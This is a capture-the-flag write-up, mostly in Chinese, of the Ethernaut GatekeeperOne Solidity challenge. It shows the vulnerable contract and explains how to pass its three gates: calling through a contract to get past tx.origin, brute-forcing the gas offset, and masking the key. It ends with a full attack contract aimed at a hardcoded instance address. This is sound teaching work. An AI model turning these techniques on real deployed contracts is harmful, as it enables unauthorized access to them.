## 0x01 Task

```javascript
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

如何过三道门呢？

## 0x02 Solution

`gateOne()` 利用之前做过的 Telephone 的知识，从第三方合约来调用 `enter()` 即可满足条件。

> 假设用户通过合约A调用合约B：
>
> - 对于合约A：tx.origin和msg.sender都是用户
> - 对于合约B：tx.origin是用户，msg.sender是合约A的地址

`gateTwo()` 需要满足 `msg.gas % 8191 == 0`通过debug调试得到，等下再说。

`gateThree()` 也比较简单，将 `tx.origin` 倒数三四字节换成 0000 即可。
`bytes8(tx.origin) & 0xFFFFFFFF0000FFFF` 即可满足条件。

`require(uint32(_gateKey) == uint16(_gateKey));`
`require(uint32(_gateKey) != uint64(_gateKey));`
`require(uint32(_gateKey) == uint16(tx.origin));`

This means that the integer key, when converted into various byte sizes, need to fulfil the following properties:

- `0x11111111 == 0x1111`, which is only possible if the value is masked by `0x0000FFFF`
- `0x1111111100001111 != 0x00001111`, which is only possible if you keep the preceding values, with the mask `0xFFFFFFFF0000FFFF`

`gateTwo()` 需要满足 `msg.gas % 8191 == 0`

这里使用爆破的方法解决：

```javascript
contract Attack {

    address public instance_address = 0xad94d66bd88f94f2bb78c0e592b018277294dde9;
    bytes8 public _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    GatekeeperOne target = GatekeeperOne(instance_address);

    function hack() public {
        // target.call.gas(999999)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        for (uint256 i = 0; i < 120; i++) {
            target.call.gas(i + 150 + 8191 * 3)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        }
    }
}
```

> Note: the proper gas offset to use will vary depending on the compiler
>
> version and optimization settings used to deploy the factory contract.
>
> To migitage, brute-force a range of possible values of gas to forward.
>
> Using call (vs. an abstract interface) prevents reverts from propagating.
>
> gas offset usually comes in around 210, give a buffer of 60 on each side.

full exp：

```javascript
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {

    address public instance_address = 0xad94d66bd88f94f2bb78c0e592b018277294dde9;
    bytes8 public _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    GatekeeperOne target = GatekeeperOne(instance_address);

    function hack() public {
        // target.call.gas(999999)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        for (uint256 i = 0; i < 120; i++) {
            target.call.gas(i + 150 + 8191 * 3)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        }
    }
}
```

